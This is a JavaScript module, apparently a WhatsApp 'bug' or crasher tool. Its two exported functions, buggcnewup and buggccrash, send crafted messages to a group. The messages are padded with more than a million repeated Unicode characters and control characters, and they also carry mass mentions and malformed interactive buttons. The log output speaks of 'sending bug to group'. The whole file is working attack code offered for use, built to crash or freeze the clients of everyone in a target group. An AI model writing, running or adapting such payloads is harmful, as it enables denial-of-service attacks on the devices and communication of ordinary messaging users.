import { generateWAMessageFromContent } from '@nexustechpro/baileys';
import crypto from "crypto"
import chalk from "chalk";
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function buggcnewup(sock, groupId) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "nexuskillyou" + "ꦾ".repeat(1200000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(1200000),
            inviteExpiration: Date.now() + 18144000000, // 21 hari
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0003".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: groupId,
            groupSubject: "nexuskillyou",
          },
        ],
      },
    };

    await sock.relayMessage(groupId, message, {}); // Hapus userJid untuk grup
    console.log(`Success sending bug to group: ${groupId}`);
  } catch (err) {
    console.error("Error sending newsletter:", err);
  }
}
async function buggccrash(sock, groupId) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              documentMessage: {
                contactVcard: true,
              },
            },
          },
          body: {
            text: "⭑̤⟅ ༑ ▾⭑̤▾ ⿻ Nexus 𝙆͢𝙞𝙡𝙡 𝙔͢𝙤𝙪̌ ⿻ ▾ ༑̴⟆ ‏⭑̤",
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(groupId, message, {});
  console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ GodZeno ⿻ ▾⭑"));
}

export { 
  //GROUP
  buggccrash,
  buggcnewup
};